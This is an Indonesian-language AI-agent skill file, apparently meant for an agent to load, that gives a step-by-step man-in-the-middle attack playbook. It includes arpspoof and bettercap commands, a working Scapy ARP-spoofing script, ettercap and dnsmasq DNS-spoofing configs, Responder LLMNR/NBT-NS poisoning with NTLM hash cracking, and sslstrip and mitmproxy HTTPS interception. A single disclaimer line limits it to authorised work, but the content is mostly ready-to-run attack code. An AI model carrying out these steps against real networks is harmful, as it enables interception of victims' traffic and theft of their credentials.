---
name: mitm-network
description: |
  Man-in-the-Middle attack & network poisoning dalam Bahasa Indonesia. Gunakan saat user mau ARP spoofing, DNS spoofing, LLMNR poisoning, atau MITM attack.
  kata kunci: mitm, man in the middle, arp spoofing, dns spoofing, llmnr poisoning, nbtns, responder, bettercap, mitmproxy, sslstrip, ettercap, arpspoof, network sniffing, packet capture, traffic interception.
---

# MITM Network — ARP Spoofing, DNS Poisoning, LLMNR

> **Disclaimer:** Skill ini HANYA untuk jaringan yang lo miliki atau dapat izin (red team engagement, CTF, lab). Attack tanpa izin = ilegal.

---

## Prerequisites

```bash
# Tools
apt install responder -y
apt install bettercap -y
apt install ettercap-text-only -y
apt install arpspoof -y
apt install mitmproxy -y

# Python tools
pip install scapy
pip install netifaces

# Kernel setting
echo 1 > /proc/sys/net/ipv4/ip_forward
```

---

## Workflow Step-by-Step

### Tahap 1 — Network Recon

```bash
# 1. Cek network config
ip addr
ip route
arp -a

# 2. Scan jaringan
nmap -sn 192.168.1.0/24

# 3. Cek gateway
ip route | grep default

# 4. Cek neighbors
arp -a
ip neigh
```

---

### Tahap 2 — ARP Spoofing

> ARP spoofing = pura-pura jadi gateway → semua traffic lewat lo.

#### Method 1: arpspoof (ettercap)

```bash
# 1. Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# 2. Spoof victim → bilang lo adalah gateway
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# 3. Spoof gateway → bilang lo adalah victim
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# 4. Capture traffic
tcpdump -i eth0 -w capture.pcap
```

#### Method 2: Bettercap (recommended)

```bash
# 1. Start bettercap
sudo bettercap -iface eth0

# 2. Setuju module
> caplets.show
> net.provision on

# 3. ARP spoof
> arp.spoof on

# 4. DNS spoof
> dns.spoof on

# 5. Sniff
> net.sniff on
```

#### Method 3: Scapy (Python)

```python
#!/usr/bin/env python3
from scapy.all import *
import sys

interface = "eth0"
target_ip = "192.168.1.100"
gateway_ip = "192.168.1.1"

def spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=getmacbyip(target_ip), psrc=spoof_ip)
    send(packet, verbose=False)

def restore(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=getmacbyip(target_ip), psrc=spoof_ip, hwsrc=getmacbyip(spoof_ip))
    send(packet, count=4, verbose=False)

try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        time.sleep(2)
except KeyboardInterrupt:
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
```

---

### Tahap 3 — DNS Spoofing

> DNS spoofing = redirect domain ke IP lo.

#### Bettercap DNS Spoof

```bash
# Bettercap
> set dns.spoof.domains target.com
> set dns.spoof.address 192.168.1.50
> dns.spoof on
```

#### Ettercap DNS Spoof

```bash
# Edit /etc/ettercap/etter.dns
target.com      A   192.168.1.50
*.target.com    A   192.168.1.50

# Jalankan
ettercap -T -i eth0 -P dns_spoof
```

#### dnsmasq (Fake DNS)

```bash
# dnsmasq.conf
address=/#/192.168.1.50
interface=eth0
dhcp-range=192.168.1.100,192.168.1.200,12h

# Jalankan
dnsmasq -C dnsmasq.conf -d
```

---

### Tahap 4 — LLMNR/NBT-NS Poisoning

> LLMNR & NBT-NS = fallback DNS resolution di Windows. Lo bisa poison → capture NTLM hash.

#### Responder

```bash
# 1. Start Responder
responder -I eth0 -wrf

# 2. Tunggu user akses share
# Responder akan poison LLMNR/NBT-NS → redirect ke lo

# 3. Capture NTLMv2 hash
# Hash tersimpan di /usr/share/responder/logs/

# 4. Crack hash
hashcat -m 5600 hash.txt wordlist.txt
# atau
john --wordlist=wordlists.txt hash.txt
```

**Responder modes:**

| Mode | Fungsi |
|------|--------|
| `-wrf` | LLMNR + NBT-NS + MDNS poison |
| `-wF` | WPAD auth capture |
| `-P` | Proxy auth capture |

---

### Tahap 5 — HTTPS Interception (SSL/TLS)

> HTTPS = harder to intercept, tapi bisa di-bypass.

#### 5.1 mitmproxy (recommended)

```bash
# 1. Start mitmproxy
mitmproxy --mode transparent --listen-port 8080

# 2. Redirect traffic ke mitmproxy
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080

# 3. Install mitmproxy CA di victim
# Buka http://mitm.it → install CA
```

#### 5.2 SSLstrip

```bash
# Downgrade HTTPS → HTTP
sslstrip -l 8080

# Redirect
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
```

#### 5.3 HSTS Bypass

```bash
# Kalau HSTS enabled, SSLstrip gak work
# Alternatif:
# 1. Subdomain manipulation (sub.domain.com mungkin gak di-HSTS)
# 2. DNS rebinding
# 3. Cached credentials
```

---

### Tahap 6 — Network Sniffing

```bash
# TCPDump
tcpdump -i eth0 -w capture.pcap
tcpdump -i eth0 -nn host 192.168.1.100
tcpdump -i eth0 -nn port 80

# Wireshark (GUI)
wireshark

# tshark (CLI)
tshark -i eth0 -w capture.pcap
tshark -r capture.pcap -Y "http"
```

**Useful filters:**

| Filter | Fungsi |
|--------|--------|
| `http` | HTTP traffic |
| `dns` | DNS queries |
| `tcp.port == 443` | HTTPS traffic |
| `ip.addr == 192.168.1.100` | Specific host |
| `http.authorization` | HTTP auth headers |

---

## Attack Summary

| Attack | Tool | Target | Impact |
|--------|------|--------|--------|
| ARP Spoof | arpspoof/bettercap | LAN | Traffic interception |
| DNS Spoof | bettercap/dnsmasq | LAN | Phishing/redirect |
| LLMNR Poison | Responder | Windows LAN | NTLM hash capture |
| SSL Strip | sslstrip | Web | Credential theft |
| MITM Proxy | mitmproxy | All | Full traffic control |

---

## Tool Cheat Sheet

| Tool | Fungsi |
|------|--------|
| bettercap | Swiss army knife MITM |
| responder | LLMNR/NBT-NS/MDNS poison |
| arpspoof | ARP spoofing |
| ettercap | MITM framework |
| mitmproxy | HTTPS proxy |
| sslstrip | HTTPS downgrade |
| tcpdump | Packet capture |
| wireshark | Traffic analysis |
| scapy | Python packet crafting |

---

## Resources

- **Bettercap docs**: https://www.bettercap.org/
- **Responder**: https://github.com/lgandx/Responder
- **mitmproxy**: https://mitmproxy.org/
- **OWASP MITM**: https://owasp.org/

---

*End skill — gas lanjut, jangan mandek ya tod.*

---

## See Also (Module Terkait)

| Jika Task Lo... | Module Lain yang Relevan |
|-----------------|-------------------------|
| Credential capture | `core/active-directory/SKILL.md` — AD auth |
| Traffic analysis | `core/forensics/SKILL.md` — PCAP forensics |
| SSL stripping | `core/pentest-web/SKILL.md` — Web pentest |
| WiFi MITM | `core/wifi-pentest/SKILL.md` — WiFi pentest |
| Network exploitation | `core/exploit-dev/SKILL.md` — Exploit dev |
